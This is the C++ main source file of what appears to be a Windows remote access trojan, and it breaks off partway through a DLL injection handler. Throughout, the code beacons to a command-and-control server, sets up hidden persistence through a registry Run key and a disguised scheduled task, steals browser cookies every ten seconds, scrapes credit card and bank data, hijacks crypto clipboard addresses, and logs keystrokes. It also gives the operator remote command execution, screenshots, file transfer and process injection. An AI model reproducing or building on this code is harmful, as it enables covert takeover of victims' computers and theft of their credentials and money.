#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <cctype>
#include <vector>

#include <ws2tcpip.h>
#include <psapi.h>
#include <tlhelp32.h>
#include "persistence.h"
#include "keyboard.h"
#include "input_control.h"
#include "utils.h"
#include "exec_command.h"
#include "send_file.h"
#include "screen_capture.h"
#include "file_browser.h"
#include "process_utils.h"
#include "injection.h"
#include "fake_update.h"
#include "cookie_grabber.h"
#include "data_scraper.h"
#include "hidden_desktop.h"
#include "clipboard_monitor.h"
#include "window_monitor.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")

// Define NTSTATUS and related macros if winternl.h is not available
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Helper function to escape JSON strings
std::string escapeJson(const std::string& input) {
    std::string output;
    output.reserve(input.length());
    
    for (char c : input) {
        switch (c) {
            case '"':  output += "\\\""; break;
            case '\\': output += "\\\\"; break;
            case '/':  output += "\\/"; break;
            case '\b': output += "\\b"; break;
            case '\f': output += "\\f"; break;
            case '\n': output += "\\n"; break;
            case '\r': output += "\\r"; break;
            case '\t': output += "\\t"; break;
            default:
                if (static_cast<unsigned char>(c) < 0x20 || c == 0x7f) {
                    char buf[7];
                    snprintf(buf, sizeof(buf), "\\u%04x", static_cast<unsigned char>(c));
                    output += buf;
                } else {
                    output += c;
                }
                break;
        }
    }
    
    return output;
}

#ifdef C2_PORT_NUM
const int C2_PORT = C2_PORT_NUM;
#else
const int C2_PORT = 4444;
#endif

bool persistenceEnabled = false;
bool keyloggerRunning = false;
bool cookieGrabRunning = false;

// Forward declarations
bool sendAll(SOCKET sock, const char* data, int length);

// Background thread: grabs browser cookies every 10 seconds

DWORD WINAPI CookieGrabThread(LPVOID lpParam) {
    SOCKET sock = *(SOCKET*)lpParam;
    while (cookieGrabRunning) {
        Sleep(10000); // 10 seconds
        if (!cookieGrabRunning) break;
        std::cout << "[COOKIE] Auto-grabbing browser cookies\n";
        std::string cookieData = GrabAllBrowserCookies();
        if (!cookieData.empty()) {
            std::string toSend = cookieData + "\n";
            sendAll(sock, toSend.c_str(), toSend.length());
            std::cout << "[COOKIE] Auto-grab data sent\n";
        }
    }
    return 0;
}

bool sendAll(SOCKET sock, const char* data, int length) {
    int totalSent = 0;
    while (totalSent < length) {
        int bytesSent = send(sock, data + totalSent, length - totalSent, 0);
        if (bytesSent <= 0) { // SOCKET_ERROR or connection closed
            return false;
        }
        totalSent += bytesSent;
    }
    return true;
}

void sendResponse(SOCKET sock, const char* msg) { 
    std::string fullMsg = std::string(msg) + "\n";
    sendAll(sock, fullMsg.c_str(), fullMsg.length());
}

void trimInPlace(char* text) {
    if (!text || text[0] == '\0') {
        return;
    }

    size_t len = strlen(text);
    while (len > 0 && isspace(static_cast<unsigned char>(text[len - 1]))) {
        text[--len] = '\0';
    }

    char* start = text;
    while (*start && isspace(static_cast<unsigned char>(*start))) {
        ++start;
    }

    if (start != text) {
        memmove(text, start, strlen(start) + 1);
    }
}

// RelocateToTemp has been removed.
// The downloader stub (stub.exe) now handles placement in %APPDATA%,
// persistence via registry Run key and scheduled task, and self-deletion.
// The RAT binary (myapp.exe) runs directly from %APPDATA%\Microsoft\Windows\Caches\winupdate.exe

// Create a Windows scheduled task for crash recovery and boot persistence
// Called AFTER connection is established
void CreateWatchdogTask(const char* exePath) {
    // Use schtasks to create a task that runs at user logon
    // Properly formatted command string
    std::string taskCmd = std::string("schtasks /create /tn \"WindowsHelperTask\" /tr \"") + 
                          exePath + "\" /sc onlogon /rl highest /f";
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    
    // Don't wait - fire and forget, non-blocking
    CreateProcessA(NULL, const_cast<char*>(taskCmd.c_str()), NULL, NULL, FALSE, 
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

// Single-instance mutex name - prevents multiple copies of the RAT running
const char* RAT_MUTEX_NAME = "Global\\WindowsHelperMutex";

// Debug log helper — writes timestamped lines to %TEMP%\wud.log
static FILE* g_dbgLog = nullptr;
static void dbgLog(const char* msg) {
    if (!g_dbgLog) {
        char tmp[MAX_PATH];
        GetTempPathA(MAX_PATH, tmp);
        strcat(tmp, "wud.log");
        g_dbgLog = fopen(tmp, "a");
    }
    if (g_dbgLog) {
        fprintf(g_dbgLog, "%s\n", msg);
        fflush(g_dbgLog);
    }
}

int main(int argc, char* argv[]) {
    // Disable console output to prevent crashes when running without a console window
    // Redirect std::cout and std::cerr to the null device
    static std::ofstream nullStream("nul");
    std::cout.rdbuf(nullStream.rdbuf());
    std::cerr.rdbuf(nullStream.rdbuf());

    dbgLog("=== RAT START ===");
    
    // === SINGLE INSTANCE CHECK ===
    // Create a named mutex - if it already exists, another instance is running
    HANDLE hMutex = CreateMutexA(NULL, FALSE, RAT_MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        dbgLog("MUTEX: already exists, exiting");
        CloseHandle(hMutex);
        return 0; // Silently exit - another instance is already running
    }
    dbgLog("MUTEX: acquired");
    // hMutex stays open for the lifetime of the process
    // When the process exits, the mutex is automatically released
    
    // === STEALTH INIT ===
    // The downloader stub (stub.exe) handles placement in %APPDATA%,
    // persistence, and self-deletion. The RAT runs directly from
    // %APPDATA%\Microsoft\Windows\Caches\winupdate.exe
    
    // Default server — overridden by compile-time define or argv[1]
    #ifdef C2_SERVER_STR
    #define _STR2(x) #x
    #define _STR(x) _STR2(x)
    const char* C2_SERVER = _STR(C2_SERVER_STR);
    #undef _STR2
    #undef _STR
    #else
    const char* C2_SERVER = "127.0.0.1";
    #endif
    
    // Use compile-time USER_ID_STR if defined, otherwise fall back to empty
    #ifdef USER_ID_STR
    #define _STRINGIFY(x) #x
    #define _TOSTRING(x) _STRINGIFY(x)
    std::string user_id = _TOSTRING(USER_ID_STR);
    #undef _STRINGIFY
    #undef _TOSTRING
    #else
    std::string user_id = "";
    #endif
    
    // Check for command line arguments
    // argv[1] is the C2 server address (if it doesn't start with -)
    if (argc >= 2 && argv[1][0] != '-') {
        C2_SERVER = argv[1];
        std::cout << "Using C2 server: " << C2_SERVER << "\n";
        
        // Check for user_id as second argument
        if (argc >= 3) {
            user_id = argv[2];
            std::cout << "Using command-line user_id: " << user_id << "\n";
        } else {
            std::cout << "No command-line user_id, using: " << user_id << "\n";
        }
    } else {
        std::cout << "No C2 server specified, using default: " << C2_SERVER << "\n";
        std::cout << "No command-line user_id, using: " << user_id << "\n";
    }
    
    std::cout << "C2 port: " << C2_PORT << "\n";
    
    // === INFINITE RECONNECT LOOP ===
    // The entire connection + command loop is wrapped in an infinite loop
    // so if the C2 server goes down, the RAT keeps trying to reconnect forever
    while (true) {
        dbgLog("LOOP: WSAStartup");
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed\n";
            Sleep(5000);
            continue;
        }
        
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed\n";
            WSACleanup();
            Sleep(5000);
            continue;
        }

        // Prevent send() from blocking forever if C2 server TCP window is full
        DWORD sendTimeout = 5000; // 5 seconds
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&sendTimeout, sizeof(sendTimeout));

        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(C2_PORT);
        
        // Support domain names (ngrok) and IP addresses
        struct hostent *he = gethostbyname(C2_SERVER);
        if (he == NULL) {
            std::cerr << "Domain resolution failed\n";
            closesocket(sock);
            WSACleanup();
            Sleep(5000);
            continue;
        }
        memcpy(&serverAddr.sin_addr, he->h_addr_list[0], he->h_length);
        
        std::cout << "Connecting to " << C2_SERVER << ":" << C2_PORT << "\n";
        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cerr << "Connection failed\n";
            closesocket(sock);
            WSACleanup();
            Sleep(5000);
            continue;
        }
        
        dbgLog("CONNECTED");
        std::cout << "Connected!\n";
        
        char hostname[256], username[256], os_version[256];
        GetSystemInfo(hostname, sizeof(hostname), username, sizeof(username));
        GetOSVersion(os_version, sizeof(os_version));

        char beacon[512];
        sprintf(beacon, "BEACON|%s|%s|%s|%s\n", hostname, username, user_id.c_str(), os_version);
        dbgLog("BEACON: sending");
        send(sock, beacon, strlen(beacon), 0);
        dbgLog("BEACON: sent");
        std::cout << "Beacon sent: " << beacon;
        
        // === POST-CONNECTION STEALTH ACTIONS ===
        // Connection is confirmed working, now do persistence
        
        // 1. Auto-persistence: add to Windows startup registry
        char selfPath[MAX_PATH];
        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
        dbgLog("PERSIST: AddToStartup");
        AddToStartup("WindowsHelper", selfPath);
        dbgLog("PERSIST: CreateWatchdogTask");
        // 2. Create watchdog scheduled task for crash recovery + boot persistence
        CreateWatchdogTask(selfPath);
        dbgLog("PERSIST: done");
        
        // === END POST-CONNECTION STEALTH ===
        
        dbgLog("THREAD: starting cookie grabber");
        // Start auto cookie grabber thread
        cookieGrabRunning = true;
        HANDLE hCookieThread = CreateThread(NULL, 0, CookieGrabThread, &sock, 0, NULL);
        dbgLog("THREAD: cookie grabber started");
        if (hCookieThread) {
            std::cout << "[COOKIE] Auto cookie grabber thread started (every 10s)\n";
        } else {
            cookieGrabRunning = false;
            std::cout << "[COOKIE] Failed to start auto cookie grabber thread\n";
        }
        
        // Start Data Scraper (Phase A: File Scanner + Credit Card/Bank Finder)
        dbgLog("DATASCRAPER: starting");
        DataScraper dataScraper;
        dataScraper.Start(sock);
        dbgLog("DATASCRAPER: started");
        std::cout << "[DATASCRAPER] Auto-started (file scanner + credit card/bank finder)\n";

        // Start clipboard hijacker (crypto clipper)
        dbgLog("CLIPPER: starting");
        StartClipperThread(sock);
        dbgLog("CLIPPER: started");
        std::cout << "[CLIPPER] Clipboard monitor started\n";

        // Start window monitor (auto-screenshot on keyword window titles)
        dbgLog("WINMON: starting");
        StartWindowMonitor(sock);
        dbgLog("WINMON: started");
        std::cout << "[WINMON] Window monitor started\n";
        
        // Initialize hidden desktop system for stealth mode
        dbgLog("HIDDEN: skipped (keeps SendInput on WinSta0/default desktop)");
        
        char command[4096];

        char output[65536];
        DWORD bytesWritten;
        
        dbgLog("RECV LOOP: entering");
        EnableDebugPrivilege();

        HMODULE ntdll = LoadLibraryA("ntdll.dll");
        using pNtSuspendProcess = NTSTATUS (NTAPI *)(HANDLE);
        using pNtResumeProcess = NTSTATUS (NTAPI *)(HANDLE);
        pNtSuspendProcess NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(ntdll, "NtSuspendProcess");
        pNtResumeProcess NtResumeProcess = (pNtResumeProcess)GetProcAddress(ntdll, "NtResumeProcess");

        // Pending command flags to prevent duplicate processing
        bool processingProcessList = false;

        // TCP stream buffer — recv() can batch multiple \n-terminated commands
        // into a single call (e.g. mouse_move + mouse_click in the same packet).
        // We accumulate data here and dispatch each complete line individually.
        std::string tcpRecvBuf;

        while (true) {
            char recvChunk[4096];
            int bytesReceived = recv(sock, recvChunk, sizeof(recvChunk) - 1, 0);
            
            if (bytesReceived <= 0) {
                if (bytesReceived == 0) {
                    std::cout << "[MAIN] Connection closed gracefully by server\n";
                } else {
                    std::cout << "[MAIN] recv error, WSAGetLastError: " << WSAGetLastError() << "\n";
                }
                break;
            }
            
            recvChunk[bytesReceived] = '\0';
            tcpRecvBuf.append(recvChunk, bytesReceived);

            // Dispatch every complete (newline-terminated) command in the buffer.
            size_t nlPos;
            while ((nlPos = tcpRecvBuf.find('\n')) != std::string::npos) {
                std::string cmdLine = tcpRecvBuf.substr(0, nlPos);
                tcpRecvBuf.erase(0, nlPos + 1);
                if (cmdLine.size() >= sizeof(command)) cmdLine.resize(sizeof(command) - 1);
                memcpy(command, cmdLine.c_str(), cmdLine.size() + 1);
                trimInPlace(command);
                if (command[0] == '\0') continue;
                std::cout << "[CMD] " << command << "\n";
            
            if (istricmp(command, "exit") == 0) {
                std::cout << "Exit command\n";
                break;
            }
            
            if (istricmp(command, "KILL_RAT") == 0) {
                std::cout << "[KILL] Kill command received - terminating RAT permanently\n";
                // Remove persistence
                RemoveFromStartup("WindowsHelper");
                // Remove scheduled task
                std::string delTask = "schtasks /delete /tn \"WindowsHelperTask\" /f";
                STARTUPINFOA si = { sizeof(si) };
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                PROCESS_INFORMATION pi;
                CreateProcessA(NULL, const_cast<char*>(delTask.c_str()), NULL, NULL, FALSE, 
                               CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                // Release mutex so a new instance can start
                if (hMutex) {
                    ReleaseMutex(hMutex);
                    CloseHandle(hMutex);
                }
                // Exit immediately - no reconnect
                ExitProcess(0);
            }
            
            if (istrnicmp(command, "exec ", 5) == 0) {
                const char* cmd = command + 5;
                if (ExecuteLocalCommand(cmd, output, sizeof(output), &bytesWritten)) {
                    send(sock, output, bytesWritten, 0);
                } else {
                    sendResponse(sock, "Command execution failed");
                }
                continue;
            }
            
            if (istricmp(command, "screenshot") == 0) {
                // Capture and encode to Base64 to send back to dashboard
                std::string b64Data = CaptureScreenToJPEG(70, 0, 0);
                if (!b64Data.empty()) {
                    std::string header = "SCREENSHOT|" + std::to_string(b64Data.size()) + "|";
                    std::string message = header + b64Data + "\n";
                    sendAll(sock, message.c_str(), message.size());
                    sendResponse(sock, "Screenshot captured and uploaded to dashboard");
                } else {
                    sendResponse(sock, "Failed to capture screenshot");
                }
                continue;
            }

            // Screenshot streaming commands
            if (istrnicmp(command, "screenshot_stream_start", 23) == 0) {
                int fps = 5;
                int quality = 70;
                int width = 1280;
                int height = 720;

                // Parse optional parameters: screenshot_stream_start fps=5 quality=70 width=1280 height=720
                char* token = strtok((char*)command + 23, " ");
                while (token) {
                    if (strncmp(token, "fps=", 4) == 0) {
                        fps = atoi(token + 4);
                    } else if (strncmp(token, "quality=", 8) == 0) {
                        quality = atoi(token + 8);
                    } else if (strncmp(token, "width=", 6) == 0) {
                        width = atoi(token + 6);
                    } else if (strncmp(token, "height=", 7) == 0) {
                        height = atoi(token + 7);
                    }
                    token = strtok(NULL, " ");
                }
                
                if (StartScreenshotStream(sock, fps, quality, width, height)) {
                    char response[256];
                    sprintf(response, "Screenshot streaming started (fps=%d, quality=%d, size=%dx%d)", 
                            fps, quality, width, height);
                    sendResponse(sock, response);
                } else {
                    sendResponse(sock, "Failed to start screenshot streaming");
                }
                continue;
            }
            
            if (istricmp(command, "screenshot_stream_stop") == 0) {
                if (IsScreenshotStreaming()) {
                    std::cout << "[MAIN] Stopping stream...\n";
                    StopScreenshotStream();
                    std::cout << "[MAIN] Stream thread stopped. Sending response...\n";
                    sendResponse(sock, "Screenshot streaming stopped");
                    std::cout << "[MAIN] Response sent.\n";
                } else {
                    sendResponse(sock, "Screenshot streaming not active");
                }
                continue;
            }
            
            if (istricmp(command, "screenshot_stream_status") == 0) {
                if (IsScreenshotStreaming()) {
                    sendResponse(sock, "Screenshot streaming is active");
                } else {
                    sendResponse(sock, "Screenshot streaming is not active");
                }
                continue;
            }
            
            if (istricmp(command, "keylog_start") == 0) {
                if (!keyloggerRunning) {
                    if (StartKeyboardHook("C:\\temp\\keylog.txt")) {
                        keyloggerRunning = true;
                        sendResponse(sock, "Keylogger started");
                    } else {
                        sendResponse(sock, "Failed to start keylogger");
                    }
                } else {
                    sendResponse(sock, "Keylogger already running");
                }
                continue;
            }
            
            if (istricmp(command, "keylog_stop") == 0) {
                if (keyloggerRunning) {
                    StopKeyboardHook();
                    keyloggerRunning = false;
                    sendResponse(sock, "Keylogger stopped");
                } else {
                    sendResponse(sock, "Keylogger not running");
                }
                continue;
            }

            if (istricmp(command, "keylog_get") == 0) {
                std::string json = FlushKeylogs();
                if (json.empty()) json = "[]";
                // Send as KEYLOG|<size>|<json>
                std::string header = "KEYLOG|" + std::to_string(json.size()) + "|";
                std::string msg    = header + json + "\n";
                int total = (int)msg.size(), sent = 0;
                while (sent < total) {
                    int n = ::send(sock, msg.c_str() + sent, total - sent, 0);
                    if (n <= 0) break;
                    sent += n;
                }
                continue;
            }
            
            if (istricmp(command, "persistence_on") == 0) {
                if (!persistenceEnabled) {
                    if (AddToStartup("WindowsHelper", "C:\\temp\\myapp.exe")) {
                        persistenceEnabled = true;
                        sendResponse(sock, "Persistence enabled");
                    } else {
                        sendResponse(sock, "Failed to enable persistence");
                    }
                } else {
                    sendResponse(sock, "Persistence already enabled");
                }
                continue;
            }
            
            if (istricmp(command, "persistence_off") == 0) {
                if (persistenceEnabled) {
                    if (RemoveFromStartup("WindowsHelper")) {
                        persistenceEnabled = false;
                        sendResponse(sock, "Persistence disabled");
                    } else {
                        sendResponse(sock, "Failed to disable persistence");
                    }
                } else {
                    sendResponse(sock, "Persistence not enabled");
                }
                continue;
            }
            
            // Upload command: upload <filepath>
            if (istrnicmp(command, "upload ", 7) == 0) {
                const char* filepath = command + 7;
                std::cout << "[UPLOAD] Receiving file: " << filepath << "\n";
                
                // Receive file size
                long long fileSize = 0;
                int sizeBytes = recv(sock, (char*)&fileSize, sizeof(fileSize), 0);
                if (sizeBytes != sizeof(fileSize) || fileSize <= 0) {
                    sendResponse(sock, "Failed to receive file size");
        
                    continue;
                }
                
                std::cout << "[UPLOAD] File size: " << fileSize << " bytes\n";
                
                // Create directory if needed
                char dirPath[MAX_PATH];
                strcpy(dirPath, filepath);
                char* lastSlash = strrchr(dirPath, '\\');
                if (lastSlash) {
                    *lastSlash = '\0';
                    CreateDirectoryA(dirPath, NULL);
                }
                
                // Open file for writing
                std::ofstream file(filepath, std::ios::binary);
                if (!file.is_open()) {
                    sendResponse(sock, "Failed to create file");
                    continue;
                }
                
                // Receive file content
                char buffer[8192];
                long long remaining = fileSize;
                bool success = true;
                
                while (remaining > 0) {
                    int chunkSize = (remaining > sizeof(buffer)) ? sizeof(buffer) : (int)remaining;
                    int received = recv(sock, buffer, chunkSize, 0);
                    
                    if (received <= 0) {
                        success = false;
                        break;
                    }
                    
                    file.write(buffer, received);
                    remaining -= received;
                }
                
                file.close();
                
                if (success) {
                    char response[256];
                    sprintf(response, "File uploaded: %s (%lld bytes)", filepath, fileSize);
                    sendResponse(sock, response);
                    std::cout << "[UPLOAD] File saved: " << filepath << "\n";
                } else {
                    sendResponse(sock, "Failed to receive file content");
                    std::cout << "[UPLOAD] Failed to receive file content\n";
                }
                continue;
            }
            
            // Download command: download <filepath>
            // Sends file as base64 text: FILE_DATA|<size>|<base64data>
            if (istrnicmp(command, "download ", 9) == 0) {
                const char* filepath = command + 9;
                std::cout << "[DOWNLOAD] Sending file: " << filepath << "\n";
                
                // Open file for reading
                std::ifstream file(filepath, std::ios::binary | std::ios::ate);
                if (!file.is_open()) {
                    sendResponse(sock, "DOWNLOAD_RESULT|error|File not found");
                    continue;
                }
                
                // Get file size
                long long fileSize = file.tellg();
                file.seekg(0, std::ios::beg);
                
                if (fileSize <= 0 || fileSize > 100 * 1024 * 1024) { // 100MB max
                    file.close();
                    char resp[256];
                    sprintf(resp, "DOWNLOAD_RESULT|error|Invalid file size: %lld", fileSize);
                    sendResponse(sock, resp);
                    continue;
                }
                
                std::cout << "[DOWNLOAD] File size: " << fileSize << " bytes\n";
                
                // Read entire file into memory
                std::vector<char> fileData((size_t)fileSize);
                file.read(fileData.data(), fileSize);
                file.close();
                
                // Base64 encode the file data
                static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                std::string encoded;
                encoded.reserve(((size_t)fileSize + 2) / 3 * 4);
                
                for (size_t i = 0; i < (size_t)fileSize; i += 3) {
                    int val = (unsigned char)fileData[i] << 16;
                    if (i + 1 < (size_t)fileSize) val |= (unsigned char)fileData[i + 1] << 8;
                    if (i + 2 < (size_t)fileSize) val |= (unsigned char)fileData[i + 2];
                    
                    encoded += b64[(val >> 18) & 0x3F];
                    encoded += b64[(val >> 12) & 0x3F];
                    encoded += (i + 1 < (size_t)fileSize) ? b64[(val >> 6) & 0x3F] : '=';
                    encoded += (i + 2 < (size_t)fileSize) ? b64[val & 0x3F] : '=';
                }
                
                // Send as: FILE_DATA|<size>|<base64data>\n
                std::string header = "FILE_DATA|" + std::to_string(fileSize) + "|";
                std::string message = header + encoded + "\n";
                
                if (sendAll(sock, message.c_str(), (int)message.size())) {
                    std::cout << "[DOWNLOAD] File sent: " << filepath << " (" << fileSize << " bytes, base64: " << encoded.size() << " chars)\n";
                } else {
                    std::cout << "[DOWNLOAD] Failed to send file content\n";
                }
                continue;
            }

            
            // File browser commands
            if (istrnicmp(command, "list_dir ", 9) == 0) {
                const char* path = command + 9;
                std::cout << "[FILEBROWSER] Listing directory: " << path << "\n";
                std::string result = FileBrowser::ListDirectory(path);
                
                // Format response so the bridge can parse it
                std::string formatted = "FILE_BROWSER_RESPONSE|" + result + "\n";
                  sendAll(sock, formatted.c_str(), formatted.length());
                continue;
            }
            
            if (istricmp(command, "list_drives") == 0) {
                std::cout << "[FILEBROWSER] Listing drives\n";
                std::string result = FileBrowser::GetDrives();
                
                std::string formatted = "FILE_BROWSER_D_RESPONSE|" + result + "\n";
                sendAll(sock, formatted.c_str(), formatted.length());
                continue;
            }
            
            if (istrnicmp(command, "cd ", 3) == 0) {
                const char* path = command + 3;
                std::cout << "[FILEBROWSER] Changing directory to: " << path << "\n";
                if (FileBrowser::ChangeDirectory(path)) {
                    std::string currentDir = FileBrowser::GetCurrentDirectory();
                    sendResponse(sock, currentDir.c_str());
                } else {
                    sendResponse(sock, "Failed to change directory");
                }
                continue;
            }
            
            if (istricmp(command, "pwd") == 0) {
                std::string currentDir = FileBrowser::GetCurrentDirectory();
                sendResponse(sock, currentDir.c_str());
                continue;
            }
            
            if (istrnicmp(command, "mkdir ", 6) == 0) {
                const char* path = command + 6;
                std::cout << "[FILEBROWSER] Creating directory: " << path << "\n";
                if (FileBrowser::CreateDirectory(path)) {
                    sendResponse(sock, "Directory created");
                } else {
                    sendResponse(sock, "Failed to create directory");
                }
                continue;
            }
            
            if (istrnicmp(command, "rm ", 3) == 0) {
                const char* path = command + 3;
                std::cout << "[FILEBROWSER] Deleting: " << path << "\n";
                if (FileBrowser::DeletePath(path)) {
                    sendResponse(sock, "Deleted successfully");
                } else {
                    sendResponse(sock, "Failed to delete");
                }
                continue;
            }
            
            // Recursive delete: rm_rf <path>
            if (istrnicmp(command, "rm_rf ", 6) == 0) {
                const char* path = command + 6;
                std::cout << "[FILEBROWSER] Recursive delete: " << path << "\n";
                if (FileBrowser::DeleteRecursive(path)) {
                    sendResponse(sock, "Recursive delete successful");
                } else {
                    sendResponse(sock, "Failed to recursive delete");
                }
                continue;
            }
            
            // Rename: rename <old> <new>
            if (istrnicmp(command, "rename ", 7) == 0) {
                char* args = command + 7;
                char* oldPath = strtok(args, "|");
                char* newPath = strtok(NULL, "|");
                if (oldPath && newPath) {
                    std::cout << "[FILEBROWSER] Renaming: " << oldPath << " -> " << newPath << "\n";
                    if (FileBrowser::RenamePath(oldPath, newPath)) {
                        sendResponse(sock, "Rename successful");
                    } else {
                        sendResponse(sock, "Failed to rename");
                    }
                } else {
                    sendResponse(sock, "Usage: rename <old_path>|<new_path>");
                }
                continue;
            }
            
            // Copy: copy <src> <dest>
            if (istrnicmp(command, "copy ", 5) == 0) {
                char* args = command + 5;
                char* src = strtok(args, "|");
                char* dest = strtok(NULL, "|");
                if (src && dest) {
                    std::cout << "[FILEBROWSER] Copying: " << src << " -> " << dest << "\n";
                    if (FileBrowser::CopyFile(src, dest)) {
                        sendResponse(sock, "Copy successful");
                    } else {
                        sendResponse(sock, "Failed to copy");
                    }
                } else {
                    sendResponse(sock, "Usage: copy <src_path>|<dest_path>");
                }
                continue;
            }
            
            // Move: move <src> <dest>
            if (istrnicmp(command, "move ", 5) == 0) {
                char* args = command + 5;
                char* src = strtok(args, "|");
                char* dest = strtok(NULL, "|");
                if (src && dest) {
                    std::cout << "[FILEBROWSER] Moving: " << src << " -> " << dest << "\n";
                    if (FileBrowser::MoveFile(src, dest)) {
                        sendResponse(sock, "Move successful");
                    } else {
                        sendResponse(sock, "Failed to move");
                    }
                } else {
                    sendResponse(sock, "Usage: move <src_path>|<dest_path>");
                }
                continue;
            }
            
            // Search files: search <root> <pattern> [maxResults]
            if (istrnicmp(command, "search ", 7) == 0) {
                char* args = command + 7;
                char* root = strtok(args, "|");
                char* pattern = strtok(NULL, "|");
                char* maxStr = strtok(NULL, "|");
                if (root && pattern) {
                    int maxResults = maxStr ? atoi(maxStr) : 100;
                    std::cout << "[FILEBROWSER] Searching: " << root << " for " << pattern << "\n";
                    std::string result = FileBrowser::SearchFiles(root, pattern, maxResults);
                    std::string formatted = "FILE_SEARCH_RESULT|" + result + "\n";
                    sendAll(sock, formatted.c_str(), formatted.length());
                } else {
                    sendResponse(sock, "Usage: search <root_path>|<pattern>|[maxResults]");
                }
                continue;
            }
            
            // File properties: properties <path>
            if (istrnicmp(command, "properties ", 11) == 0) {
                const char* path = command + 11;
                std::cout << "[FILEBROWSER] Getting properties: " << path << "\n";
                std::string result = FileBrowser::GetFileProperties(path);
                std::string formatted = "FILE_PROPERTIES|" + result + "\n";
                sendAll(sock, formatted.c_str(), formatted.length());
                continue;
            }
            
            // Preview text file: preview <path> [maxLines]
            if (istrnicmp(command, "preview ", 8) == 0) {
                char* args = command + 8;
                char* path = strtok(args, "|");
                char* linesStr = strtok(NULL, "|");
                if (path) {
                    int maxLines = linesStr ? atoi(linesStr) : 50;
                    std::cout << "[FILEBROWSER] Previewing: " << path << "\n";
                    std::string result = FileBrowser::PreviewTextFile(path, maxLines);
                    std::string formatted = "FILE_PREVIEW|" + result + "\n";
                    sendAll(sock, formatted.c_str(), formatted.length());
                } else {
                    sendResponse(sock, "Usage: preview <path>|[maxLines]");
                }
                continue;
            }
            
            // Touch/create empty file: touch <path>
            if (istrnicmp(command, "touch ", 6) == 0) {
                const char* path = command + 6;
                if (FileBrowser::CreateEmptyFile(path)) {
                    sendResponse(sock, "File created");
                } else {
                    sendResponse(sock, "Failed to create file");
                }
                continue;
            }
            
            // Zip file/directory: zip <path> [outputZip]
            if (istrnicmp(command, "zip ", 4) == 0) {
                char* args = command + 4;
                char* path = strtok(args, "|");
                char* outputZip = strtok(NULL, "|");
                if (path) {
                    std::string result = FileBrowser::ZipPath(path, outputZip);
                    std::string formatted = "FILE_ZIP_RESULT|" + result + "\n";
                    sendAll(sock, formatted.c_str(), formatted.length());
                } else {
                    sendResponse(sock, "Usage: zip <path>|[outputZip]");
                }
                continue;
            }
            
            // Unzip: unzip <zipPath> <outputDir>
            if (istrnicmp(command, "unzip ", 6) == 0) {
                char* args = command + 6;
                char* zipPath = strtok(args, "|");
                char* outputDir = strtok(NULL, "|");
                if (zipPath && outputDir) {
                    if (FileBrowser::UnzipTo(zipPath, outputDir)) {
                        sendResponse(sock, "Unzip successful");
                    } else {
                        sendResponse(sock, "Failed to unzip");
                    }
                } else {
                    sendResponse(sock, "Usage: unzip <zipPath>|<outputDir>");
                }
                continue;
            }
            
            // Get MIME type: mime <path>
            if (istrnicmp(command, "mime ", 5) == 0) {
                const char* path = command + 5;
                std::string mime = FileBrowser::GetMimeType(path);
                std::string formatted = "FILE_MIME|" + mime + "\n";
                sendAll(sock, formatted.c_str(), formatted.length());
                continue;
            }
            
            // Get directory size: dir_size <path>
            if (istrnicmp(command, "dir_size ", 9) == 0) {
                const char* path = command + 9;
                long long size = FileBrowser::GetDirectorySize(path);
                char resp[128];
                sprintf(resp, "DIR_SIZE|%lld", size);
                sendResponse(sock, resp);
                continue;
            }
            
            // Process injection commands
            if (istricmp(command, "PROCESS_LIST") == 0) {
                if (processingProcessList) {
                    std::cout << "[PROCESS] Already processing, ignoring duplicate\n";
                    continue;
                }
                processingProcessList = true;
                std::cout << "[PROCESS] Listing processes\n";
                std::string processList = GetProcessListJSON();
                std::string response = "PROCESS_LIST_RESPONSE|" + processList + "\n";
                send(sock, response.c_str(), response.length(), 0);
                processingProcessList = false;
                continue;
            }
            
            if (istrnicmp(command, "INJECT_DLL|", 11) == 0) {
                // Parse: INJECT_DLL|PID|DLL_PATH|METHOD
                std::cout << "[INJECTION] Parsing injection command: " << command << "\n";
                
                char* token = strtok((char*)command + 11, "|");
                if (!token) {
                    sendResponse(sock, "INJECTION_RESULT|false|0|0|Invalid command format");
                    continue;
                }
                
                DWORD pid = atoi(token);
                
                token = strtok(NULL, "|");
                if (!token) {
                    sendResponse(sock, "INJECTION_RESULT|false|0|0|Missing DLL path");
                    continue;
                }
                std::string dllPath = token;
                
                token = strtok(NULL, "|");
                std::string method = token ? token : "createremotethread";
                
                std::cout << "[INJECTION] Attempting to inject " << dllPath << " into PID " << pid << " using method " << method << "\n";
                
                // Enable debug privilege for process access
                EnableDebugPrivilege();
                
                // Perform injection
                BOOL success = InjectDllIntoProcess(pid, dllPath.c_str());
                
                if (success) {
                    std::string response = "INJECTION_RESULT|true|" + std::to_string(pid) + "|0|Injection successful\n";
                    send(sock, response.c_str(), response.length(), 0);
                    std::cout << "[INJECTION] Successfully injected DLL into PID " << pid << "\n";
                } else {
                    std::string response = "INJECTION_RESULT|false|" + std::to_string(pid) + "|0|Injection failed\n";
